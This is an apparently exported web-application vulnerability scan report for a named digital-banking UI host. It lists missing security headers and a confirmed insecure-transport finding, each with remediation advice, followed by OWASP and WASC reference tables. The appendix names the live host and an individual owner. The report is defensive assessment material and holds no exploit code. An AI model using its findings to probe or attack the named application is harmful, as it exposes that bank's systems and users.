"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
- All the forms in QID 150115 (Authentication Form Found)<BR>
- Certain requests from QID 150172 (Requests Crawled)","N/A","N/A",,,""
"QID","150010","External Links Discovered","Information Gathered","1","DIAG","","","",,,"External links discovered during the scan are listed in the Results section. These links were out of scope for the scan and were not crawled.","N/A","N/A",,,""
"QID","150018","Connection Error Occurred During Web Application Scan","Information Gathered","2","DIAG","","","",,,"The following are some of the possible reasons for the timeouts or connection errors:
<OL>
<LI> A disturbance in network connectivity between the scanner and the web application occurred.</LI>
<LI> The web server or application server hosting the application was taken down in the midst of a scan.</LI>
<LI> The web application experienced an overload, possibly due to load generated by the scan.</LI>
<LI> An error occurred in the SSL/TLS handshake (applies to HTTPS web applications only).</LI>
<LI> A security device, such as an IDS/IPS or web application firewall (WAF), began to drop or reject the HTTP connections from the scanner.</LI>
<LI> Very large files like PDFs, videos, etc. are present on the site and caused timeouts when accessed by the scanner.</LI>
</OL>","Some of the links were not crawled or scanned. Results may be incomplete or incorrect.","First, confirm that the server was not taken down in the midst of the scan.  After that, investigate the root cause by reviewing the listed links and examining web server logs, application server logs, or IDS/IPS/WAF logs. If the errors are caused due to load generated by the scanner then try reducing the scan intensity (this could increase the scan duration). If the errors are due to specific URLs being tested by the scanner or due to specific form data sent by the scanner, then configure exclude lists in the scan configuration as needed to avoid such requests. If timeouts or connection errors are a persistent issue but you want the scan to run to completion, change the Behavior Settings in the option profile to increase the error thresholds or disable the error checks entirely.",,,""
"QID","150020","Links Rejected By Crawl Scope or Exclusion List","Information Gathered","1","DIAG","","","",,,"One or more links were not crawled because of an explicit rule to exclude them. This also occurs if a link is malformed.
<P>
Exclude list and Include list entries can cause links to be rejected. If a scan is limited to a specific starting directory, then links outside that directory will neither be crawled or tested.
<P>
Links that contain a host name or IP address different from the target application are considered external links and not crawled by default; those types of links are not listed here. This often happens when the scope of a scan is limited to the directory of the starting URL. The scope can be changed in the Web Application Record.
<P>
During the test phase, some path-based tests may be rejected if the scan is limited to the directory of the starting URL and the test would fall outside that directory. In these cases, the number of rejected links may be too high to list in the Results section.","Links listed here were neither crawled or tested by the Web application scanning engine.","A link might have been intentionally matched by a exclude or include list entry. Verify that no links in this list were unintentionally rejected.",,,""
"QID","150021","Scan Diagnostics","Information Gathered","1","DIAG","","","",,,"This check provides various details of the scan's performance and behavior. In some cases, this check can be used to identify problems that the scanner encountered when crawling the target Web application.","The scan diagnostics data provides technical details about the crawler's performance and behavior. This information does not necessarily imply problems with the Web application.","No action is required.",,,""
"QID","150152","Forms Crawled","Information Gathered","1","DIAG","","","",,,"The Results section lists the unique forms that were identified and submitted by the scanner. The forms listed in this QID do not include authentication forms (i.e. login forms), which are reported separately under QID 150115.<P>

The scanner does a redundancy check on forms by inspecting the form fields. Forms determined to be the redundant based on identical form fields will not be tested. If desired, you can enable 'Include form action URI in form uniqueness calculation' in the WAS option profile to have the scanner also consider the form's action attribute in the redundancy check.<P>

NOTE: Any regular expression specified under 'Redundant Links' are not applied to forms. Forms (unique or redundant) are not reported under QID 150140.","N/A","N/A",,,""
"QID","150202","Missing header: X-Content-Type-Options","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The X-Content-Type-Options response header is not present. WAS reports missing X-Content-Type-Options header on each crawled link for both static and dynamic responses. The scanner performs the check not only on 200 responses but 4xx and 5xx responses as well. It's also possible the QID will be reported on directory-level links.","All web browsers employ a content-sniffing algorithm that inspects the contents of HTTP responses and also occasionally overrides the MIME type provided by the server. If X-Content-Type-Options header is not present, browsers can potentially be tricked into treating non-HTML response as HTML. An attacker can then potentially leverage the functionality to perform a cross-site scripting (XSS) attack. This specific case is known as a Content-Sniffing XSS (CS-XSS) attack.



","It is recommended to disable browser content sniffing by adding the X-Content-Type-Options header to the HTTP response with a value of 'nosniff'. Also, ensure that the 'Content-Type' header is set correctly on responses.
",,,""
"QID","150204","Missing header: X-XSS-Protection","Information Gathered","1","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The X-XSS-Protection response header is not present.
","The X-XSS-Protection response header provides a layer of protection against reflected cross-site scripting (XSS) attacks by instructing browsers to abort rendering a page in which a reflected XSS attack has been detected. This is a best-effort second line of defense measure which helps prevent an attacker from using evasion techniques to avoid the neutralization mechanisms that the filters use by default. When configured appropriately, browser-level XSS filters can provide additional layers of defense against web application attacks.
<P>
Note that HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security the X-XSS-Protection header should be set on 4xx and 5xx responses as well.","It is recommend to set X-XSS-Protection header with value set to '1; mode=block' on all the relevant responses to activate browser's XSS filter.

<P><B>NOTE:</B> The X-XSS-Protection header is not supported by all browsers. Google Chrome and Safari are some of the browsers which support it, Firefox on the other hand does not support the header. X-XSS-Protection header does not guarantee a complete protection against XSS. For better protection against XSS attacks, the web application should use secure coding principles. Also, consider leveraging the Content-Security-Policy (CSP) header, which is supported by all browsers.

<P>Using X-XSS-Protection could have unintended side effects, please understand the implications carefully before using it.

<P>References:<BR>
- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection</A><BR>
- <A HREF=""https://blog.innerht.ml/the-misunderstood-x-xss-protection/"" TARGET=""_blank"">https://blog.innerht.ml/the-misunderstood-x-xss-protection/</A><BR>
- <A HREF=""https://www.mbsd.jp/blog/20160407.html"" TARGET=""_blank"">https://www.mbsd.jp/blog/20160407.html</A><BR>
- <A HREF=""https://www.chromium.org/developers/design-documents/xss-auditor"" TARGET=""_blank"">https://www.chromium.org/developers/design-documents/xss-auditor</A>",,,""
"QID","150206","Content-Security-Policy Not Implemented","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"No Content-Security-Policy (CSP) is specified for the page. WAS checks for the missing CSP on all static and dynamic pages. It checks for CSP in the response headers (Content-Security-Policy, X-Content-Security-Policy or X-Webkit-CSP) and in response body (http-equiv=""Content-Security-Policy"" meta tag).<P>

HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security it's important to set appropriate CSP policies on 4xx and 5xx responses as well.
","Content-Security Policy is a defense mechanism that can significantly reduce the risk and impact of XSS attacks in modern browsers. The CSP specification provides a set of content restrictions for web resources and a mechanism for transmitting the policy from a server to a client where the policy is enforced. When a Content Security Policy is specified, a number of default behaviors in user agents are changed; specifically inline content and JavaScript eval constructs are not interpreted without additional directives. In short, CSP allows you to create a whitelist of sources of the trusted content. The CSP policy instructs the browser to only render resources from those whitelisted sources. Even though an attacker can find a security vulnerability in the application through which to inject script, the script won't match the whitelisted sources defined in the CSP policy, and therefore will not be executed.<P>

The absence of Content Security Policy in the response will allow the attacker to exploit vulnerabilities as the protection provided by the browser is not at all leveraged by the Web application. If secure CSP configuration is not implemented, browsers will not be able to block content-injection attacks such as Cross-Site Scripting and Clickjacking.

","Appropriate CSP policies help prevent content-injection attacks such as cross-site scripting (XSS) and clickjacking. It's recommended to add secure CSP policies as a part of a defense-in-depth approach for securing web applications.<P>

References:<BR>
- <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"" TARGET=""_blank"">https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</A><BR>
- <A HREF=""https://developers.google.com/web/fundamentals/security/csp/"" TARGET=""_blank"">https://developers.google.com/web/fundamentals/security/csp/</A>



",,,""
"QID","150208","Missing header: Referrer-Policy","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"No Referrer Policy is specified for the link. WAS checks for the missing Referrer Policy on all static and dynamic pages. It checks for one of the following Referrer Policy in the response headers:<P>
1) no-referrer<BR>
2) no-referrer-when-downgrade<BR>
3) same-origin<BR>
4) origin<BR>
5) origin-when-cross-origin<BR>
6) strict-origin<BR>
7) strict-origin-when-cross-origin<BR>
<P>
If the Referrer Policy header is not found , WAS checks in response body for meta tag containing tag name as ""referrer"" and one of the above Referrer Policy.","The Referrer-Policy header controls how much referrer information is sent to a site when navigating to it. Absence of Referrer-Policy header can lead to leakage of sensitive information via the referrer header.
","Referrer Policy header improves security by ensuring websites don't leak sensitive information via the referrer header. It's recommended to add secure Referrer Policies as a part of a defense-in-depth approach.<P>

References:<BR>
- <A HREF=""https://www.w3.org/TR/referrer-policy/"" TARGET=""_blank"">https://www.w3.org/TR/referrer-policy/</A><BR>
- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy</A>
",,,""
"QID","150248","Missing header: Permissions-Policy","Information Gathered","2","WEAK","A5","","CWE-284",,,"The Permissions-Policy response header is not present.","Permissions-Policy allows web developers to selectively enable, disable, or modify the behavior of some of the browser features and APIs within their application.<P>
A user agent has a set of supported features(Policy Controlled Features), which is the set of features which it allows to be controlled through policies.<P> 
Not defining policy for unused and risky policy controlled features may leave application vulnerable.<P>","It is recommended to define policy for policy controlled features to make application more secure.<P>

References:<BR>
<A HREF=""https://www.w3.org/TR/permissions-policy-1/"" TARGET=""_blank"">Permissions-Policy W3C Working Draft</A><BR>
<A HREF=""https://github.com/w3c/webappsec-permissions-policy/blob/main/features.md"" TARGET=""_blank"">Policy Controlled Features</A><BR>",,,""
"QID","150262","Missing header: Feature-Policy","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The Feature-Policy response header is not present. ","Feature Policy allows web developers to selectively enable, disable, and modify the behavior of certain APIs and web features such as ""geolocation"",""camera"", ""usb"", ""fullscreen"", ""animations"" etc in the browser.
<P> 
These policies restrict what APIs the site can access or modify the browser's default behavior for certain features.","It is recommended to set the Feature-Policy header to selectively enable, disable, and modify the behavior of certain APIs and web features.<P>

References:<BR>
- <A HREF=""https://www.w3.org/TR/feature-policy/"" TARGET=""_blank"">https://www.w3.org/TR/feature-policy/</A><BR>
- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy</A>",,,""
"QID","150263","Insecure Transport","Confirmed Vulnerability","3","INFO","A2","WASC-4","CWE-319","6.4","5.8","A link is functional over an insecure, HTTP connection. No redirection to HTTPS occurs.  Note that this QID is reported for 200/OK responses as well as 4xx and 5xx responses.","Data sent over a non-HTTPS connection is unencrypted and vulnerable to network sniffing attacks that can expose sensitive or confidential information. This includes non-secure cookies and other potentially sensitive data contained in HTTP headers. Even if no sensitive data is transmitted, man-in-the-middle (MITM) attacks are possible over non-HTTPS connections. An attacker who exploits MITM can intercept and change the conversation between the client (e.g., web browser, mobile device, etc.) and the server.<P>

More information: <A HREF=""https://developers.google.com/web/fundamentals/security/encrypt-in-transit/why-https"" TARGET=""_blank"">Why HTTPS Matters</A>","Ensure that all links are accessible over HTTPS only. The most secure design is for the application to listen and respond only to encrypted HTTPS requests. Alternatively, if non-HTTPS requests are accepted, the server should redirect these requests to HTTPS using a 301 or 302 response.<P>

It is also strongly recommended to use <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"" TARGET=""_blank"">HTTP Strict Transport Security</A> (HSTS) so that web browsers are instructed to use only HTTPS when making requests to the server. QID 150135 will be reported when links without HSTS are found.<P>

For more information, see the <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#application"" TARGET=""_blank"">Application section of OWASP's Transport Layer Protection Cheat Sheet</A>.","7.6","6.6","Network"
"QID","150528","Server Returns HTTP 4XX Error Code During Scanning","Information Gathered","1","DIAG","","","",,,"During the WAS scan, links with HTTP 4xx response code were observed and these are listed in the Results section. The HTTP 4xx message indicates a client error. The list of supported 4xx response code are as below:

<P>400 - Bad Request<BR>
401 - Unauthorized<BR>
403 - Forbidden<BR>
404 - Not Found<BR>
405 - Method Not Allowed<BR>
407 - Proxy Authentication Required<BR>
408 - Request Timeout<BR>
413 - Payload Too Large<BR>
414 - URI Too Long<BR>


","The presence of a HTTP 4xx error during the crawl phase indicates that some problem exists on the website that will be encountered during normal usage of the Web application. Note WAS depends on responses to detect many vulnerabilities if the link does not respond with an expected response then any vulnerabilities present on such links may not be detected.","Review each link to determine why the client encountered an error while requesting the link. Additionally review and investigate the results of QID 150042 which lists 5xx errors, QID 150019 which lists unexpected response codes and QID 150097 which lists a potential blocked request. ",,,""
"QID","150546","First Link Crawled Response Code Information","Information Gathered","1","DIAG","","","",,,"The Web server returned the following information from where the Web application scanning engine initiated. 
Information reported includes First Link Crawled, response Code, response Header, and response Body (first 500 characters). 
The first link crawled is the ""Web Application URL (or Swagger file URL)"" set in the Web Application profile.","An erroneous response might be indicative of a problem in the Web server, or the scan configuration.","Review the information to check if this is in line with the expected scan configuration. Refer to the output of QIDs 150009, 150019, 150021, 150042 and 150528 (if present) for additional details.",,,""
"GROUP","Name","Category"
"GROUP","PATH","VULNERABILITY"
"GROUP","CC","SENSITIVE_CONTENT"
"GROUP","DIAG","INFORMATION_GATHERED"
"GROUP","BUGCROWD","VULNERABILITY"
"GROUP","SSN-US","SENSITIVE_CONTENT"
"GROUP","WEAK","INFORMATION_GATHERED"
"GROUP","CUSTOM","SENSITIVE_CONTENT"
"GROUP","XSS","VULNERABILITY"
"GROUP","INFO","VULNERABILITY"
"GROUP","COMPLIANCE","VULNERABILITY"
"GROUP","BURP","VULNERABILITY"
"GROUP","SQL","VULNERABILITY"
"OWASP","Code","Name"
"OWASP","A1","Broken Access Control"
"OWASP","A2","Cryptographic Failures"
"OWASP","A3","Injection"
"OWASP","A4","Insecure Design"
"OWASP","A5","Security Misconfiguration"
"OWASP","A6","Vulnerable and Outdated Components"
"OWASP","A7","Identification and Authentication Failures"
"OWASP","A8","Software and Data Integrity Failures"
"OWASP","A9","Security Logging and Monitoring Failures"
"OWASP","A10","Server Side Request Forgery (SSRF)"
"WASC","Code","Name"
"WASC","WASC-1","INSUFFICIENT AUTHENTICATION"
"WASC","WASC-2","INSUFFICIENT AUTHORIZATION"
"WASC","WASC-3","INTEGER OVERFLOWS"
"WASC","WASC-4","INSUFFICIENT TRANSPORT LAYER PROTECTION"
"WASC","WASC-5","REMOTE FILE INCLUSION"
"WASC","WASC-6","FORMAT STRING"
"WASC","WASC-7","BUFFER OVERFLOW"
"WASC","WASC-8","CROSS-SITE SCRIPTING"
"WASC","WASC-9","CROSS-SITE REQUEST FORGERY"
"WASC","WASC-10","DENIAL OF SERVICE"
"WASC","WASC-11","BRUTE FORCE"
"WASC","WASC-12","CONTENT SPOOFING"
"WASC","WASC-13","INFORMATION LEAKAGE"
"WASC","WASC-14","SERVER MISCONFIGURATION"
"WASC","WASC-15","APPLICATION MISCONFIGURATION"
"WASC","WASC-16","DIRECTORY INDEXING"
"WASC","WASC-17","IMPROPER FILESYSTEM PERMISSIONS"
"WASC","WASC-18","CREDENTIAL/SESSION PREDICTION"
"WASC","WASC-19","SQL INJECTION"
"WASC","WASC-20","IMPROPER INPUT HANDLING"
"WASC","WASC-21","INSUFFICIENT ANTI-AUTOMATION"
"WASC","WASC-22","IMPROPER OUTPUT HANDLING"
"WASC","WASC-23","XML INJECTION"
"WASC","WASC-24","HTTP REQUEST SPLITTING"
"WASC","WASC-25","HTTP RESPONSE SPLITTING"
"WASC","WASC-26","HTTP REQUEST SMUGGLING"
"WASC","WASC-27","HTTP RESPONSE SMUGGLING"
"WASC","WASC-28","NULL BYTE INJECTION"
"WASC","WASC-29","LDAP INJECTION"
"WASC","WASC-30","MAIL COMMAND INJECTION"
"WASC","WASC-31","OS COMMANDING"
"WASC","WASC-32","ROUTING DETOUR"
"WASC","WASC-33","PATH TRAVERSAL"
"WASC","WASC-34","PREDICTABLE RESOURCE LOCATION"
"WASC","WASC-35","SOAP ARRAY ABUSE"
"WASC","WASC-36","SSI INJECTION"
"WASC","WASC-37","SESSION FIXATION"
"WASC","WASC-38","URL REDIRECTOR ABUSE"
"WASC","WASC-39","XPATH INJECTION"
"WASC","WASC-40","INSUFFICIENT PROCESS VALIDATION"
"WASC","WASC-41","XML ATTRIBUTE BLOWUP"
"WASC","WASC-42","ABUSE OF FUNCTIONALITY"
"WASC","WASC-43","XML EXTERNAL ENTITIES (XXE)"
"WASC","WASC-44","XML ENTITY EXPANSION"
"WASC","WASC-45","FINGERPRINTING"
"WASC","WASC-46","XQUERY INJECTION"
"WASC","WASC-47","INSUFFICIENT SESSION EXPIRATION"
"WASC","WASC-48","INSECURE INDEXING"
"WASC","WASC-49","INSUFFICIENT PASSWORD RECOVERY"
"APPENDIX"
"Web Application Name","URL","Owner","Scope","ID","Tags","Custom Attributes"
"fint-int-digitalbankingui-nra.azurewebsites","https://fint-int-digitalbankingui-nra.azurewebsites.net","Dixith Thirukkovalluru (fntsu8dt)","Limit to URL hostname","36092606","",""
